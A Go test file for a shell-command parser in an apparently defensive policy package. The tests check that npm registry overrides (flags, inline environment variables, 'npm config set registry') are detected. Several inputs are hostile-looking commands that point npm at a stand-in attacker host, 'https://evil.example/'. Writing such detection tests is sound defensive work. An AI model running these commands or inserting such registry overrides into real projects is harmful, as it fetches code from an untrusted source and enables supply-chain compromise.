package policy

import "testing"

func TestParseShellExtractsRegistryFlag(t *testing.T) {
	for _, in := range []string{
		"npm install --registry=https://evil.example/ lodash",
		"npm install --registry https://evil.example/ lodash",
	} {
		got := ParseShell(in)
		if got.Binary != "npm" {
			t.Errorf("%q: bin %s", in, got.Binary)
		}
		if got.RegistryFlag != "https://evil.example/" {
			t.Errorf("%q: registry %s", in, got.RegistryFlag)
		}
	}
}

func TestParseShellExtractsUserconfig(t *testing.T) {
	got := ParseShell("npm install --userconfig=/tmp/x.npmrc")
	if got.UserconfigFlag != "/tmp/x.npmrc" {
		t.Errorf("userconfig: %s", got.UserconfigFlag)
	}
}

func TestParseShellExtractsInlineEnv(t *testing.T) {
	got := ParseShell("NPM_CONFIG_REGISTRY=https://evil.example/ DEBUG=1 npm install")
	if got.InlineEnv["NPM_CONFIG_REGISTRY"] != "https://evil.example/" {
		t.Errorf("env NPM_CONFIG_REGISTRY: %v", got.InlineEnv)
	}
	if got.InlineEnv["DEBUG"] != "1" {
		t.Errorf("env DEBUG: %v", got.InlineEnv)
	}
	if got.Binary != "npm" {
		t.Errorf("bin: %s", got.Binary)
	}
}

func TestParseShellHandlesEnvPrefix(t *testing.T) {
	got := ParseShell("env NPM_CONFIG_REGISTRY=https://evil.example/ npm install")
	if got.InlineEnv["NPM_CONFIG_REGISTRY"] != "https://evil.example/" {
		t.Errorf("env: %v", got.InlineEnv)
	}
	if got.Binary != "npm" {
		t.Errorf("bin: %s", got.Binary)
	}
}

func TestParseShellRecognizesConfigSet(t *testing.T) {
	got := ParseShell("npm config set registry https://evil.example/")
	if got.ConfigOp != "set" {
		t.Errorf("op: %s", got.ConfigOp)
	}
	if got.ConfigKey != "registry" || got.ConfigValue != "https://evil.example/" {
		t.Errorf("key/value: %s %s", got.ConfigKey, got.ConfigValue)
	}
}

func TestParseShellRecognizesConfigDelete(t *testing.T) {
	got := ParseShell("npm config delete registry")
	if got.ConfigOp != "delete" || got.ConfigKey != "registry" {
		t.Errorf("op/key: %s %s", got.ConfigOp, got.ConfigKey)
	}
}

func TestParseShellRecognizesConfigEdit(t *testing.T) {
	got := ParseShell("npm config edit")
	if got.ConfigOp != "edit" {
		t.Errorf("op: %s", got.ConfigOp)
	}
}

func TestParseShellPathPrefixedBinaryStripped(t *testing.T) {
	got := ParseShell("/usr/local/bin/pnpm install --registry=https://x/")
	if got.Binary != "pnpm" {
		t.Errorf("bin: %s", got.Binary)
	}
	if got.RegistryFlag != "https://x/" {
		t.Errorf("registry: %s", got.RegistryFlag)
	}
}
